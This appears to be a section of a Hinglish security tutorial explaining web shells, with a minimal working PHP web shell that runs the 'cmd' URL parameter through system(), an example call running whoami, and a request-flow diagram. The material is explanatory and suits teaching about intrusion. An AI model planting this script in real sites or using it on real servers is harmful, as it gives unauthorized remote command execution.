# PART 4 — WEB SHELL

## 1. Web Shell kya hai?

**Web shell** ek server-side script hoti hai jo web server ke through commands execute karne ki capability provide karti hai.

Example PHP:

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Yahan:

```text
$_GET['cmd']
```

URL se `cmd` parameter ki value leta hai.

Example concept:

```text
shell.php?cmd=whoami
```

Server PHP code execute karta hai aur command ka output response mein de sakta hai.

---

## 2. Web Shell ka basic flow

```text
Browser
   ↓
shell.php?cmd=whoami
   ↓
Web Server
   ↓
PHP executes command
   ↓
Command output
   ↓
Browser
```

### Important

Web shell **browser mein command execute nahi karti**.

Command **server par execute hoti hai**.

